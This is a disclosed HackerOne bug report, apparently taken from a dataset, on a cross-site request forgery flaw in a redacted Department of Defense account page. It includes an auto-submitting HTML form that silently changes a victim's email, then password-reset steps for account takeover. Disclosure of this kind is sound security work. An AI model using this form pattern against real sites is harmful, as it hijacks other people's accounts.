---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1626356'
original_report_id: '1626356'
title: Account Takeover and Information update due to cross site request forgery via
  POST █████████/registration/my-account.cfm
weakness: Cross-Site Request Forgery (CSRF)
team_handle: deptofdefense
created_at: '2022-07-05T14:34:27.797Z'
disclosed_at: '2022-10-14T13:28:47.202Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# Account Takeover and Information update due to cross site request forgery via POST █████████/registration/my-account.cfm

## Metadata

- HackerOne Report ID: 1626356
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: deptofdefense
- Disclosed At: 2022-10-14T13:28:47.202Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
Hello Team,

While researching on https://████/ , I found a cross site request forgery attack which leads to account's information update and that further leads to account takeover via password reset functionality.

## Steps To Reproduce:
Check This video for understanding the attack scenario.
████████

### Scenarios & Steps:

Suppose there is a user which is logged in to their account.
Now attacker sent him a malicious link which will lead to account information update.

Steps for above scenario are:

1. Victim must be logged in to ███/registration/index.cfm .
2. Attacker sent him a malicious link.
    For this attacker need to step a server which contain below code:

    ```
    <html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="█████/registration/my-account.cfm" method="POST">
      <input type="hidden" name="cmdSubmit" value="Update&#32;My&#32;Account" />
      <input type="hidden" name="txtFirstname" value="fname" />
      <input type="hidden" name="txtMI" value="hi" />
      <input type="hidden" name="txtLastname" value="lnames" />
      <input type="hidden" name="txtAddress" value="hello" />
      <input type="hidden" name="optAddress" value="temporary" />
      <input type="hidden" name="txtPhone" value="89" />

        <!-- here we enter  a temporary email address via online tools like tempmail  -->
      <input type="hidden" name="txtEmail1" value="voyan61996&#64;jrvps&#46;com" />
      <input type="hidden" name="txtEmail2" value="voyan61996&#64;jrvps&#46;com" />
      <input type="hidden" name="txtPassword1" value="" />
      <input type="hidden" name="txtPassword2" value="" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
    ```

Step 3:
Now victim will click on the link sent by the attacker.
After clicking the link; information is updated on the victims account and the email is also updated which will further lead to account takeover.

Now Attacker side:

Step 1:
Visit ████/

Step 2:
In Forgot your password Form :
Enter the victim username. And click on generate a new password.

Step 3:
Check the email which is entered in the csrf exploit. Here you find the password of that user.

Step 4:
Visit ███/
Enter the username and password. And now you are successfully takeover the victim account.

## Problems
1. There is no Anti-CSRF Token.
2. Sending password to an unverified account which leads to account takeover.

## Supporting Material/References:

  * █████

## Impact

Attacker is able to takeover any account and change the information of any account via csrf.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
